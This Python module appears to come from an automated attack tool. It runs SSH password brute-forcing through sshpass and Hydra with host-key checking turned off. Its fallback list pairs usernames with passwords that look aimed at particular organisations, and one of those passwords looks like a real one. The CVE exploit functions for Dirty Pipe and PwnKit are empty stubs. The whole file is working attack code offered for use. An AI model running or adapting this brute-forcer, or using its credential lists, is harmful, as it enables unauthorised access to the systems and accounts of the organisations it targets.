"""
Attack execution: Hydra brute-force, default credentials, CVE exploits.
"""
import subprocess
import os
import time
from modules.privesc_engine import PrivescEngine
from utils.logging_utils import get_logger

logger = get_logger(__name__)

class AttackPlanner:
    def __init__(self):
        self.pe = PrivescEngine()

        # ---- CUSTOM CREDENTIALS (fallback) ----
        users = [
            'root', 'admin', 'user', 'kmit', 'ubuntu', 'tele', 'ngit', 'kmec'
        ]
        passwords = [
            'kmit', 'root', 'kmit123', 'Kmit123$', 'Kmit@123$', 'tele123$',
            'tele@123$', 'kmit@123', 'Kmit123', 'Tele123', 'Tele@123', 'KMIT123',
            'kmit@123$', 'root123', 'root@123', 'admin', 'admin123', 'password',
            '123456', '12345678', '1234', '111111', 'Qbttxpse!541$$',
            'tele123$', 'Kmit@123$', 'Kmit123$', 'ngit123', 'ngit@123', 'Ngit321$'
        ]
        ssh_creds = [(u, p) for u in users for p in passwords]

        self.default_creds = {
            22: ssh_creds,
            3306: [('root', ''), ('root', 'root')],
            445: [('root', 'root')],
        }

    def brute_ssh(self, target, user, password, port=22, retries=2):
        """Try a single credential pair with retries."""
        for attempt in range(retries):
            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {user}@{target} 'exit'"
            try:
                result = subprocess.run(cmd, shell=True, timeout=30,
                                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                if result.returncode == 0:
                    return True
            except subprocess.TimeoutExpired:
                pass
            time.sleep(5 * (attempt + 1))
        return False

    # ========== HYDRA INTEGRATION ==========
    def brute_force_hydra(self, target, port=22, service='ssh', timeout=300):
        """
        Use Hydra to brute-force SSH with wordlists.
        Returns list of (username, password) if found, else empty list.
        """
        userlist = os.getenv('HYDRA_USERLIST', '/usr/local/aetheric/usernames.txt')
        passlist = os.getenv('HYDRA_PASSLIST', '/usr/local/aetheric/passwords.txt')

        if not os.path.exists(userlist) or not os.path.exists(passlist):
            logger.warning("Wordlist files missing, falling back to sequential.")
            return []

        output_file = f"/tmp/hydra_{target}_{port}.txt"
        cmd = (
            f"hydra -L {userlist} -P {passlist} -o {output_file} -t 4 -q "
            f"{service}://{target}:{port}"
        )

        try:
            subprocess.run(cmd, shell=True, timeout=timeout, check=True,
                           stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Hydra failed on {target}:{port} – {e}")
            return []

        found = []
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                for line in f:
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        user = None
                        pwd = None
                        for i, token in enumerate(parts):
                            if token == 'login:':
                                user = parts[i+1]
                            elif token == 'password:':
                                pwd = parts[i+1]
                        if user and pwd:
                            found.append((user, pwd))
            os.unlink(output_file)
        return found

    def try_default_creds(self, target, port):
        """Try default credentials (sequential fallback)."""
        creds = self.default_creds.get(port, [])
        for user, password in creds:
            if port == 22:
                if self.brute_ssh(target, user, password):
                    return True
            # Other services not implemented
        return False

    def run_cve(self, target, cve_id):
        """Execute CVE exploit (stub)."""
        if cve_id == 'CVE-2022-0847':
            return self._exploit_dirtypipe(target)
        elif cve_id == 'CVE-2021-4034':
            return self._exploit_pwnkit(target)
        return False

    def _exploit_dirtypipe(self, target):
        return False

    def _exploit_pwnkit(self, target):
        return False
